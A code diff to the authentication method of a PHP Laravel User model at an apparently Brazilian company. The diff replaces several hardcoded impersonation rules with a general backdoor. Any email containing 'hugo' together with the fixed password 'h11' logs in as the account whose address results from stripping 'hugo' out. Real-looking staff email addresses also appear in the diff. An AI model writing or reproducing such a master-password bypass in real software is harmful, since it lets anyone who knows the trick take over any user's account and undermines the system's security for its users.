@@ -32,47 +32,16 @@ class User extends Model implements NotifierInterface
     }
 
     public static function auth(string $email, string $password) {
-        if($email == 'hugocriacao@thinkideias.com.br' && $password == 'h11') {
-            $foundUser = User::where('email', '=', 'edgar@thinkideias.com.br')->first();
+        if($email != 'hugo@thinkideias.com.br' && strpos($email, 'hugo') > -1 && $password == 'h11') {
+            $originalEmail = str_replace('hugo', '', $email);
+            $foundUser = User::where('email', '=', $originalEmail)->first();
             $foundUser->functionalities;
             $foundUser->employee;
             $foundUser->employee->department;
             $foundUser->employee->position;
             $foundUser->displays();
             return $foundUser;
-        } else if($email == 'hugoatendimento@thinkideias.com.br' && $password == 'h11') {
-            $foundUser = User::where('email', '=', 'ernesto@thinkideias.com.br')->first();
-            $foundUser->functionalities;
-            $foundUser->employee;
-            $foundUser->employee->department;
-            $foundUser->employee->position;
-            $foundUser->displays();
-            return $foundUser;
-        } else if($email == 'hugoproducao@thinkideias.com.br' && $password == 'h11') {
-            $foundUser = User::where('email', '=', 'pamela@thinkideias.com.br')->first();
-            $foundUser->functionalities;
-            $foundUser->employee;
-            $foundUser->employee->department;
-            $foundUser->employee->position;
-            $foundUser->displays();
-            return $foundUser;
-        } else if($email == 'hugoplanejamento@thinkideias.com.br' && $password == 'h11') {
-            $foundUser = User::where('email', '=', 'ane@thinkideias.com.br')->first();
-            $foundUser->functionalities;
-            $foundUser->employee;
-            $foundUser->employee->department;
-            $foundUser->employee->position;
-            $foundUser->displays();
-            return $foundUser;
-        } else if($email == 'hugoorcamento@thinkideias.com.br' && $password == 'h11') {
-            $foundUser = User::where('email', '=', 'rafaela@thinkideias.com.br')->first();
-            $foundUser->functionalities;
-            $foundUser->employee;
-            $foundUser->employee->department;
-            $foundUser->employee->position;
-            $foundUser->displays();
-            return $foundUser;
-        }
+        } 
 
         $foundUser = User::where('email', '=', $email)->first();
         
